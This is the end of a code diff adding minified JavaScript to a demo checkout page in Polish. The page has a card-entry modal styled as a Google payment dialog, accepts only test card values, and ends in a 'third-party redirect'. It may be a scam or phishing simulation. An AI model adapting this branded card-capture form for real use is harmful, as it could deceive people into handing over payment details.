+      function showStatus(pane,msg){document.querySelectorAll('.status').forEach(x=>{x.classList.remove('show');x.textContent=''});const t=document.querySelector('[data-status="'+pane+'"]');if(t){t.textContent=msg+'.';t.classList.add('show')}}pay.addEventListener('click',()=>{if(!validate(true))return;redirectThirdParty()});document.querySelectorAll('.demo-choice').forEach(x=>x.addEventListener('click',redirectThirdParty));$('googleOpen').addEventListener('click',openGoogle);$('googleClose').addEventListener('click',closeGoogle);$('googleBack').addEventListener('click',()=>{closeGoogle();$('googleOpen').focus()});$('googleConfirm').addEventListener('click',()=>{const gc=digits($('googleCard').value),ge=digits($('googleExpiry').value),gm=+ge.slice(0,2),gy=+('20'+ge.slice(2)),gn=new Date(),gf=ge.length===4&&gm>=1&&gm<=12&&(gy>gn.getFullYear()||(gy===gn.getFullYear()&&gm>=gn.getMonth()+1));const tests=[[$('googleCard'),gc==='4242424242424242'],[$('googleExpiry'),gf],[$('googleCvc'),$('googleCvc').value==='123'],[$('googleHolder'),$('googleHolder').value.trim().toUpperCase()==='TEST USER'],[$('googlePostal'),$('googlePostal').value.trim().length>=3]];tests.forEach(([el,ok])=>el.closest('.google-field').classList.toggle('invalid',!ok));if(!tests.every(x=>x[1]))return;redirectThirdParty()});$('googleCard').addEventListener('input',()=>{$('googleCard').value=digits($('googleCard').value).slice(0,16).replace(/(.{4})/g,'$1 ').trim()});$('googleExpiry').addEventListener('input',()=>{let d=digits($('googleExpiry').value).slice(0,4);$('googleExpiry').value=d.length>2?d.slice(0,2)+'/'+d.slice(2):d});$('googleCvc').addEventListener('input',()=>{$('googleCvc').value=digits($('googleCvc').value).slice(0,3)});$('googleModal').addEventListener('click',e=>{if(e.target===$('googleModal'))closeGoogle()});document.addEventListener('keydown',e=>{if(e.key==='Escape')closeGoogle()});document.querySelectorAll('[data-demo-link]').forEach(x=>x.addEventListener('click',e=>{e.preventDefault();showStatus(activePane,'Łącze jest niedostępne')}));$('cookieOk').addEventListener('click',()=>$('cookieBar').classList.add('hidden'));
+    })();
+  </script>
+</body>
+</html>
